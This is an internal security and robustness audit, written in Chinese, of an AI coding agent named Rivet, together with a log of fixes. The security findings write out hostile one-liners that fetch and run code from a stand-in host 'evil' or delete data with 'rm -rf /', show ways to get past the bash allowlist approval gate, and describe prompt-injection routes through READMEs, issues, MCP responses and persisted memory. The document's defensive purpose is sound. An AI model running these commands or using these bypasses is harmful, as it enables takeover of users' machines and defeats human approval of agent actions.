# Rivet 性能 & 安全审计 第二轮(工具层 / 持久化 / 安全 / 资源生命周期)

**日期:** 2026-06-05
**方法:** 4 个只读子代理并行(正交于第一轮的网络/中间层/压缩三维)。
**重要:** 3 个代理在合成报告阶段撞 **429 MONTHLY_LIMIT_EXCEEDED**(sonnet 月度额度耗尽),
但调查已完成(各 50-62 次工具调用),报告正文从 transcript 抢救得出。**资源生命周期代理
死在调查中途,无成型报告 —— 该维度留待额度恢复后重做。**

## 🔧 天枢修复记录 (2026-06-05)

| Commit | 文件 | 审计项 | 状态 |
|--------|------|--------|------|
| `89b1f67` | `session-registry.ts` | 持久化#1: 补 events 表 + 修 claims 列 + catch 细分 | ✅ |
| `7106e25` | `sandbox-exec-tool.ts`, `approval-risk.ts` | 安全#1: sandbox_exec requiresApproval=true + high risk | ✅ |
| `7106e25` | `permissions.ts` | 安全#2: 多词 allowlist 补 shell operator 检查 | ✅ |
| `7106e25` | `path-validate.ts` | 安全#4: realpathSync 防 symlink 遍历 | ✅ |
| `9cde7cc` | `meridian-db.ts` | 持久化#2: LIKE→GLOB 转义防 _ 误匹配 | ✅ |
| `9cde7cc` | `hash-edit.ts` | 工具#4: anchors 严格升序校验 | ✅ |
| `9cde7cc` | `read-file.ts` | 工具#5: offset 越界/<1 返回明确错误 | ✅ |
| `d7c4fe3` | `worker-session.ts`, `coordinator.ts`, `loop.ts`, `process-tracker.ts` | 第一轮 中#1+#2: worker signal 链 | ✅ |
| `2c59dad` | `anthropic-client.ts`, `codex-client.ts` | 第一轮 网#3: abort → AbortError | ✅ |
| `fe4760f` | `app.tsx` | 第一轮 TUI 真凶①: Static 重复渲染 | ✅ |

**第二轮修复 (会话 28d4eac6, 2026-06-06):**

| Commit | 文件 | 修复内容 |
|--------|------|---------|
| `33e82c0` | `permissions.ts` | 安全#3: `*` 通配从 `.*` 改为排除 shell 操作符字符 |
| `bbdc8aa` | `stigmergy.ts`, `edit.ts`, `read-file.ts`, `write-file.ts`, `path-validate.ts` | 持久化#3: stigmergy `_persist` 改用 `writeFileAtomicAsync`; 工具#1: read_file 描述修正; 工具#3: write_file staleness warn; 工具#6: edit_file stale recovery OOM guard; path-validate `resolveNearestExisting` 修复 |
| `6495ccd` | `session-registry.ts` | 持久化#4+#6: 新增 `safeRun`/`safeGet`/`safeAll` helper，所有 DB 操作 try-catch 包裹 |
| `c53f50b` | `read-file.ts`, `import-resource.ts` | 工具#1: read_file 新增 `BINARY_EXTENSIONS` 检查，真正拒绝二进制文件; 工具#2: import_resource 图片提示不再导向 read_file |
| `75b3677` | `edit.ts` | 工具#7: stale recovery 写入后刷新 mtime 到写后值，打破 edit→stale→edit 死循环（根因：会话 28d4eac6 9次编辑级联损坏） |
| `1d652d0` | `package.json` | 测试: `npm test` 加 `--test-force-exit` 防 tsx+454文件孤儿进程 |
| `b31ba91` | `session-registry.ts` | ESM `require`→`await import` (nullDb 静默失效根因) + detectCrashedSessions/reapStaleClaims 补 claims FK 删除 |
| `9718ce3` | `session-registry.ts` | acquireClaim 检查 safeRun 返回值 + 删除重复 `DELETE FROM sessions` |
| `d6824f1` | `read-section.ts` | 2MB 文件大小守卫 + "Re-read the source" 错误信息改为可执行指引（防死循环） |

**剩余待处理:**
- 持久化#5: checkpoint touched-files 读改写无锁
- 安全#5-#11: MCP/SSRF/DNS/注入 机制隐患
- 资源生命周期维度 (代理夭折,待重做)

## 验证状态图例

- ✅ **主代理亲验** —— 我独立读码/跑测试确认,可直接信。
- 📋 **代理报告(带 file:line,未逐条复核)** —— 证据具体,但我没逐条复跑,落地前应抽验。

---

## ✅ 亲验核心(4 条,已独立确认)

### 1. SQLite SCHEMA 损坏 —— 已发货,session-registry 整体静默禁用【极高】
- **文件:** `src/agent/session-registry.ts:45-91`(SCHEMA)、`:108` exec、`:109-111` catch→NullDb
- **验证:** `:64` 建 `CREATE INDEX idx_events_session ON events(...)`,但 45-91 整块**无 `CREATE TABLE events`**;
  `:232` 又 `INSERT INTO events`。`CREATE INDEX` 即便带 `IF NOT EXISTS`,events 表不存在仍抛
  "no such table: events" → `:108 db.exec(SCHEMA)` 抛 → `:109 catch` → `:111 createNullDb()`。
- **HEAD 提交版确认:** `git show HEAD` —— events 索引存在(1)、CREATE TABLE events 缺失(0)→ **已提交、已发货**,
  工作区对该文件干净(非他人 WIP)。
- **测试确认:** `npx tsx --test session-registry*.test.ts` 失败,断言呈 NullDb 签名(`actual:0, expected:2`)。
- **附加缺陷(主代理新发现):** `:110` 的 catch 错误信息是
  `"⚠ better-sqlite3 not available. Session registry disabled — running in memory-only mode."`
  —— 它把 **schema bug 伪装成"库没装"**。任何人排查都会被误导去查 better-sqlite3 依赖,真因(坏 schema)被掩盖。
  **catch 过宽**:应区分"库缺失"与"schema 执行失败"。
- **第二处 bug:** `:56-62` claims 表列为 `file_path/claim_type/confidence_trend/detail/priority/created_at`,
  缺 `session_id`、`acquired_at`;但 `:182` INSERT 写 `(session_id, file_path, claim_type, acquired_at)` —— 即便 events
  修好,claims 写入仍会失败。
- **影响:** 跨 session 协调(claims 文件锁 / events / cycle_relay / crash 检测)运行时全部失效,且无声。
- **修复方向:** 补 `CREATE TABLE events`、修正 claims 列、catch 内细分库缺失 vs schema 错误(schema 错误应显式报)。
- **疑似根因:** `.ts` 被手改未走编译;gitignored 的旧 `.js`(`src/**/*.js` 在 `.gitignore:6`)schema 是对的,
  但 tsx/tsup 都吃 `.ts` → 坏版本生效。佐证:`:439-440` 有不可达的重复 `return`(手改痕迹)。

### 2. sandbox_exec ≈ RCE,零审批零风险评估【CRITICAL】
- **文件:** `src/tools/sandbox-exec-tool.ts:61` + `src/tools/sandbox-exec.ts:46,64-66`
- **验证:** `:61 requiresApproval(): boolean { return false }`;`grep sandbox` 在 `approval-risk.ts`/`permissions.ts`
  **零命中**(无风险分支);child 经 `execFile`(`:8`)跑普通 node,`:46/64-66` 注入 `HOME`/`PATH`,
  持有完整 `fs`/`child_process`/`net`。"sandbox" 命名误导 —— 非隔离环境。
- **攻击:** 一次 prompt injection(恶意 README/issue/MCP 响应)即可让模型调 `sandbox_exec`,
  零审批读 `~/.ssh/id_rsa` 或 `require('child_process').execSync('curl evil|sh')`。比 bash 更隐蔽(bash 有写/危险模式门控)。
- **修复方向:** 加 `requiresApproval` + `assessToolRisk` 归 high;或 Node `--permission` 真限制;至少剥离 child 的 child_process/net。

### 3. bash allowlist 多词分支不扫 shell 操作符【HIGH】
- **文件:** `src/agent/permissions.ts:79-84`(多词)vs `:90-95`(单词)
- **验证:** 多词分支(`entry.includes(' ')`)命中后**只判下一字符是空格/Tab 即 return true**,
  不像单词分支跑 `!SHELL_OPERATOR_RE.test(remainder)`。注释自称 "NOT git status&&rm" 仅对无空格成立。
- **攻击:** 配 `bash.allowlist:["git status"]` 后,`git status && rm -rf /` / `git status; curl evil|sh` 前缀匹配带空格
  → `bashAllowlisted=true` → 审批门在风险判定前被短路。
- **修复方向:** 多词分支复用 `SHELL_OPERATOR_RE` 扫剩余串;allowlist 命中后仍让 DANGEROUS/INJECTION 模式有否决权。

### 4. 读写工具缺 realpath,symlink 路径遍历【HIGH】
- **文件:** `src/tools/path-validate.ts:15-27`;调用方 `read-file.ts`/`write-file.ts`/`edit.ts`/`hash-edit.ts`
- **验证:** path-validate 仅 `resolve`+`relative`+`startsWith('..')`+`isAbsolute` 字符串判定,**无 `realpathSync`**;
  对比 `glob.ts:1,67` 有 `realpathSync`+跳 symlink。读写工具与搜索工具防护不对称(已 grep 确认)。
- **攻击:** 工作区内指向区外的 symlink(可由 `import-resource` 现场建,见安全 #7),`read_file ./link` 跟随读出区外文件;
  `write_file ./link` 改写区外。
- **修复方向:** read/write/edit/hash-edit 在 validatePath 后对最终路径 `realpathSync` 复核仍在 cwd 内。

---

## 📋 安全 & 不可信数据边界(代理报告,11 条;#1/#3/#4 已亲验)

| # | 类别 | file:line | 漏洞/隐患 | 加固方向 | 严重级 | 性质 |
|---|---|---|---|---|---|---|
| 1 | 命令执行/审批 | `sandbox-exec-tool.ts:61`+`sandbox-exec.ts:60-69` | sandbox_exec 零审批任意 JS ≈ RCE(见✅#2) | 加审批+风险归 high / Node --permission | CRITICAL | ✅已验 |
| 2 | bash 审批绕过 | `permissions.ts:79-84` | 多词 allowlist 不扫 shell 操作符(见✅#3) | 复用 SHELL_OPERATOR_RE+危险模式否决权 | HIGH | ✅已验 |
| 3 | bash 审批绕过 | `permissions.ts:19-22` | `patternMatches` 把 `*`→`.*`,`git status*` 匹配 `git status&&curl evil` | 通配仅匹配单 token,不跨 `&&|;` | HIGH | 已观测 |
| 4 | 路径遍历 symlink | `path-validate.ts:15-28`+read/write/edit/hash-edit 调用方 | 缺 realpath(见✅#4) | 最终路径 realpathSync 复核 | HIGH | ✅已验 |
| 5 | MCP 信任未生效 | `approval-risk.ts:246-252`;`mcp/config.ts` 无 trust 字段 | `trustedServers/blockedTools` 硬编码空集,拉黑机制无入口、运行时不读 | McpConfig 加 trusted/blocked 字段并注入审批门 | MEDIUM | 机制隐患 |
| 6 | SSRF import_resource | `import-resource.ts:230`(`curl -sL`)+`:235`(fetch) | URL 导入无 SSRF 防护(对比 web-fetch 有),可打云元数据/内网 | 复用 web-fetch isPrivateIP+DNS 预解析;curl 禁 -L | MEDIUM | 机制隐患 |
| 7 | symlink 植入 | `import-resource.ts:160,166` | 对任意绝对路径在 .rivet/external 建 symlink,叠加#4 把区外文件合法化为区内 | 改复制而非 symlink;敏感源路径告警 | MEDIUM | 机制隐患 |
| 8 | 注入→持久化记忆 | `claim-extractor.ts:140-154`+`remember.ts:84-86`+`project-memory-loader.ts:47` | 不可信工具输出未净化截取为 claim 文本持久化,经 Tier-1 注入回系统提示;无控制标签过滤 | claim 入库前剥离/转义控制标签;tool 原文不直接落 project claim | MEDIUM | 机制隐患 |
| 9 | DNS rebinding TOCTOU | `web-fetch.ts:93-99` vs `:128` | lookup 校验后 fetch 独立重解析,两次间可 rebinding 到内网 | pin 解析得到的 IP 直连+设 Host 头 | MEDIUM | 机制隐患 |
| 10 | MCP 能力推断可欺骗 | `mcp/policy.ts:20-35`+`wrapper.ts:10,36` | 能力靠工具名正则推断,删除工具命名 `fetch_data` 即降级为低能力 | 非 trusted server 一律按最高能力,默认 deny-all | MEDIUM | 机制隐患 |
| 11 | 临时文件可预测命名 | `apply-patch.ts:18`+`sandbox-exec.ts:38` | patch/脚本写共享 /tmp,名仅 pid+时间戳,非 0o600 | mkdtemp 私有目录+mode 0o600(对齐 token-store.ts:30) | LOW | 机制隐患 |

**安全代理判定 OK(勿重复造):** bash 用 shell 而非 array-spawn 合理(防线是 deny-all-write 白名单+`sanitizeEnv:25-37` 剥离密钥);
危险命令是 deny-all-write+whitelist 范式(漏洞在 allowlist **实现**绕过,不在范式);rtkRewrite TOCTOU 已闭合(`bash.ts:54-78`);
git 工具 array-spawn 无注入;token-store 落盘 0o600+原子;API key 不入日志/错误/telemetry;web_fetch 基础 SSRF 到位(仅剩 #9);glob/grep symlink 防护可作 #4 修复模板。

---

## 📋 数据持久化完整性(代理报告,8 条;#1 已亲验)

| # | store/层 | file:line | 损坏/丢失场景 | 加固方向 | 类型 | 风险 |
|---|---|---|---|---|---|---|
| 1 | SessionRegistry SQLite | `session-registry.ts:45-91` | schema 缺 events 表+claims 列错位→NullDb→协调失效(见✅#1) | 补表/修列/catch 细分 | corruption | ✅极高 |
| 2 | MeridianDb edges | `meridian-db.ts:137,267,277` | `DELETE ... LIKE '${filePath}:%'` 未转义,`_` 匹配任意字符→误删同目录近名文件的边 | 改 `source_id=? OR GLOB ?` 或 ESCAPE 子句 | corruption | 高 |
| 3 | StigmergyStore | `stigmergy.ts:146-148` | `_persist` 裸 writeFile 非原子,崩溃→半个 JSON→下次 parse 失败 catch 返回 []→跨 session 记忆全丢 | 改 writeFileAtomicAsync | loss | 中 |
| 4 | SessionRegistry claims | `session-registry.ts:168-184` | SELECT+INSERT 非事务,跨进程两 session 同时认为持有同一 exclusive 锁→并发写覆盖 | INSERT WHERE NOT EXISTS+查 changes / IMMEDIATE 事务 | race | 中 |
| 5 | checkpoint touched-files | `checkpoint.ts:159-167` | 读改写无锁,并行工具并发调用→丢 touched 条目→rollback 漏回滚→留脏文件 | 串行化队列 / 追加式日志后合并 | race/loss | 中 |
| 6 | 全 SQLite 写方法 | `session-registry.ts:120-145` 等 | 仅 create() 有 try/catch,register/heartbeat 等无;`CREATE TABLE IF NOT EXISTS` 永不改旧库→加列后旧库 INSERT 抛未捕获 | PRAGMA user_version+迁移函数;写方法防御性 catch | migration | 中 |
| 7 | MeridianDb 日志表 | `meridian-db.ts:37-41,86-96` | access_log/sensorimotor_log 纯 append 无 prune→长项目无界增长退化 | 加 TTL/行数上限(仿 cleanupOldEvents) | 退化 | 低 |
| 8 | 死代码 | `session-registry.ts:439-440` | 重复 `return result.changes`(第二行不可达)—— #1 同源手改佐证 | 删重复行 | 代码 | 低 |

**writer 不变量合规表(代理):** project-memory ✓合规(891cc1b6 后);claim-store ✓(按 sessionId 隔离);
playbook-store ⚠ 部分(原子写✓但跨 session 共享 cwd 无锁→丢 bullet);stigmergy ✗(裸 writeFile,见#3);
SQLite 写事务✓(但 schema/LIKE/锁/迁移另算);telemetry ⚠(append 不 await,退出未 flush 丢尾行);artifact ✓(有 sha256 校验);file-history ✓。

---

## 📋 工具层正确性 & 边界(代理报告完整,12 条)

| # | 工具/文件 | file:line | 触发场景 | 修复方向 | 类型 | 风险 |
|---|---|---|---|---|---|---|
| 1 | read_file | `read-file.ts:269` vs `:226` | 描述称能读 image/PDF,实际只 `readFileSync(utf-8)` 无二进制分支→模型对 png/pdf 得乱码当内容 | 实现 base64 多模态 / 删描述+对二进制返明确错误 | correctness | 高 |
| 2 | import_resource | `import-resource.ts:88` | 导入图片返回"use read_file to view",导向#1 读不了图的工具 | 改提示语,别承诺 read_file 能 view 图片 | correctness | 中 |
| 3 | write_file | `write-file.ts:57` | 无 staleness 检测无条件覆盖(edit 有);读后被外部/另一 sub-agent 改→write 全覆盖静默丢失 | 对已读过的存量文件比对 mtime,陈旧警告 | correctness | 中 |
| 4 | hash_edit | `hash-edit.ts:173-179` | anchors 未校验升序,逆序时 firstLine>lastLine→行复制+目标块未删→静默损坏 | 校验 anchors.line 严格递增 / 内部 sort 取 min-max | correctness | 中 |
| 5 | read_file | `read-file.ts:245-250` | offset 超行数→slice 返回空→content:'' 无错误;offset<1 行为更怪。模型估错行号→空串无诊断→试错循环 | offset 越界/<1 返明确错误带文件行数 | loop-trap | 中 |
| 6 | edit_file | `edit.ts:67` vs `:131-138` | 陈旧恢复路径 readFileSync 前无 100KB 守卫(正常路径有)→大文件走恢复分支 OOM | 大小守卫前置,两路径共用 | robustness | 中 |
| 7 | edit_file | `edit.ts:61,76,87` | 陈旧恢复写入后未刷新 mtime 到写后值→之后每次 edit 都重入"modified externally"误导(自愈不死循环) | 写入后 refreshFileReadMtime(写后 statSync) | robustness | 中 |
| 8 | apply_patch | `apply-patch.ts:21,76` | `git apply --3way` 冲突时写冲突标记+返回非零;报"失败"但文件已脏留 `<<<<<<<` | 失败提示需清理 / 先 --check 通过再 apply | robustness | 中 |
| 9 | bash | `bash.ts:119,123` | `data.toString()` 逐 chunk 解码+按字符 slice(-24000),多字节跨边界→乱码 | Buffer 累积末尾统一 decode / StringDecoder | robustness | 低 |
| 10 | read_file dedup | `read-file.ts:325,336` | 去重短路仅在有 artifactId 时;小文件不入 artifact→重复读不拦,纯 token 浪费 | 小文件去重回填上次内容 / 提示 unchanged | robustness | 低 |
| 11 | edit_file | `edit.ts:143,156-161` | expected_count 仅 replace_all 分支校验;单次替换忽略该参数→模型误以为有计数保护 | 单次替换 expected_count!=1 提示 / 文档明确 | robustness | 低 |
| 12 | todo | `todo.ts:19` | 模块级单例 defaultStore,同进程多 session/sub-agent 共享→delegate 同进程跑 worker 时 todo 互相覆盖 | 按 sessionId 隔离 store(若 sub-agent 同进程) | robustness | 中(条件性) |

**工具代理判定 OK:** path-validate 字符串逃逸防护正确(但缺 realpath,见安全#4);todo-store zod 校验+regression 检测好;
hash_edit anchor 解析/陈旧检测扎实(除#4);bash isExecFailure 语义性非零码不报错正确;bash sanitizeEnv deny-all+whitelist;
web_fetch SSRF 基础防护;read_section range 校验;glob symlink 环防护;syntax-check 安全;read-policy 分类清晰。

---

## ✅ 资源生命周期 & 长会话稳定性(主代理亲查补完)

代理夭折后由主上下文逐项排查。结论:**这一层整体很健康** —— 大部分嫌疑点都已有正确的清理/上限。
只剩 2 条机制隐患,且都已被 main.tsx 的 force-exit 间接兜住。

### 机制隐患(2 条)

| # | 类别 | file:line | 当前行为 | 影响 | 优化方向 | 风险 |
|---|---|---|---|---|---|---|
| L1 | 死的后台收割 + 过期锁不回收 | `semantic-lock.ts:102,111` + `collaboration-protocol.ts:262` | `startSweep()` 仅被 `CollaborationProtocol.start()` 调用,而 **`collaboration.start()` 全仓零调用**(coordinator 只用 acquireLock/releaseLocks)。→ sweepTimer 生产环境**从不启动**,`sweepExpired()` 永不运行 | `semantic-lock.locks` Map 只靠显式 `release/releaseLocks` 清;若 session 异常未释放,过期/僵尸锁在长会话内不被后台回收(内存态随进程死,非真泄漏,但锁语义会陈旧)。另:sweepTimer 即便启动也**没 `.unref()`** | 接 collaboration.start/stop 到 coordinator 生命周期(start 于首次 acquire、stop 于 finally),或删死路径;sweepTimer 加 unref | 低-中 |
| L2 | 长生命周期 timer 缺 unref | 8 个 setInterval 仅 `oauth-auth.ts:232` 一处 unref | `main.tsx:912/982/1004`(heartbeat/perfCleanup/slowRenderMonitor)、`semantic-lock.ts:111` 无 `.unref()` | 正常路径靠 `gracefulShutdown` 的 `clearInterval`+`process.exit(0)` 强清;但任一未走 shutdown 的退出路径会被 timer 阻塞(对应历史"进程不退出"症状,已被 force-exit 缓解) | 给所有非 UI 长 timer 加 `.unref()` 作为第二道防线,不单纯依赖 force-exit | 低 |

### ✅ 已确认干净(逐项核实,非泄漏 —— 勿误改)

- **worker 父 signal listener**(`worker-session.ts:148,189`):`addEventListener({once})` + **`finally` 里 `removeEventListener`**,正常完成与异常路径都清。第一轮安全 #2 的隐患在"清理"这点上是干净的(缺陷在信号不透传语义,不在泄漏)。
- **process-tracker 全局 Set**(`tools/process-tracker.ts:7-9`):`child.on('close'/'error')` 都 `delete`,正常退出会清;`killAllSync` 强杀兜底。
- **evidence.ts**(`:183-191`):`reset()` 清全部 5 个容器(含 `fileVerificationLevels?.clear()`),`verifications` 封顶 `MAX_VERIFICATIONS=50`。夭折代理猜的 "per-file Set 累积" **不成立**。
- **各大 store 有界**:stigmergy LRU `DEFAULT_MAX_CAPACITY=200`(`stigmergy.ts:224`)、playbook `enforceCapacity`(`:74`)、trace-store `capEvents slice(-maxEvents)` + fingerprints `slice(-20)`(`:34,85`)、tool-history `recentToolHistory` cap 5(`:29`)。
- **app.tsx 6 个 per-turn tool Map**(toolAccum/toolNames/dirtyTools/toolTargetMap/toolStartMap/toolCallTracker):turn 重置(`:609-627`)+ 每 tool 完成 `delete`(`:885-888`)+ turn 完成清(`:1193-1198`),每 turn 边界清,不跨 turn 累积。
- **loop.ts per-run 清理**(`:1723-1725`):`heartbeat.stop()` + `stopFsWatcher()` 在 **`finally`**,异常/abort 也停。
- **better-sqlite3 连接**:`session-registry.ts:116`/`meridian-db.ts:116` 各单连接复用(非每操作新建);`prepare()` 多次调用由 better-sqlite3 内部按 SQL 缓存,非泄漏。
- **main.tsx gracefulShutdown**(`:131-157`):`isShuttingDown` 幂等守卫 + `try/finally`(磁盘满也不卡)+ clearInterval(heartbeat/perfCleanup)+ killChildrenSync(MCP)+ killAllSync + `process.exit(0)` force-exit 兜底。设计扎实(2026-06-05 Thread 1A/1B root-cause 的产物)。
- **retry-engine**(代理已确认):timer 与 abort 两路径都 cleanup。

### 需要 runtime 验证的点

1. **L1 锁陈旧**:跑一个 acquire 锁后异常退出(不调 releaseLocks)的 session,确认锁在同进程后续是否永不被 sweep 回收(预期:是,因 sweepTimer 未启动)。
2. **L2 退出阻塞**:在非 SIGINT/SIGTERM 路径(如未捕获 rejection)触发退出,用 `process._getActiveHandles()` 计数确认是否有 interval 阻塞(预期:有,但被 main 末尾 force-exit 兜)。
3. 长会话(100+ turn)跑后取 RSS / `--inspect` heap snapshot,确认无单调增长结构 —— 静态已确认主要容器有界,此为兜底实测。

---

## 落地优先级(主代理综合)

> 注:第二轮发现与当前在飞分支 `fix/stall-root-causes-abort-exit`(TUI 层 abort)无文件重叠。
> 安全 #1-#4 与持久化 #1 涉及 `src/tools/`、`src/agent/`、`src/api/`,均不在工作区未提交改动里。

1. **持久化#1 SQLite schema(✅极高,已发货)** —— registry 整体失效且错误信息误导排查。改动小(补表/修列),收益极大。**建议最先修。**
2. **安全#1 sandbox_exec(✅CRITICAL)** —— 零审批 RCE 面。加审批 + 风险归类。
3. **安全#2/#3 bash allowlist 绕过(✅/📋 HIGH)** + **安全#4 symlink 遍历(✅HIGH)** —— 审批/沙箱边界被绕过。
4. 持久化#2 LIKE 注入误删边、#3 stigmergy 非原子写;工具#1 read_file 假称多模态、#3 write 无 staleness。
5. 其余 MEDIUM/LOW 与机制隐患按维护窗口处理。
6. **资源生命周期**(已亲查补完):L1/L2 均为低-中机制隐患,已被 force-exit 兜住,优先级低于上述安全/持久化项。

---

## 验证账目(主代理诚实标注)

- **亲验(读码+跑测试):** 持久化#1(含 HEAD 已提交确认 + 测试失败 + catch 误导信息附加发现)、安全#1/#2/#4、**资源生命周期全维度**(L1/L2 + 7 项"已确认干净"逐项核实)。
- **代理报告(file:line 具体,未逐条复跑):** 工具层 12 条、安全 #5-#11、持久化 #2-#8 及不变量表。落地前应对要改的那条先抽验。
- **本轮全程只读,未改任何源码;此文档为新建 known-issue,无需测试。**
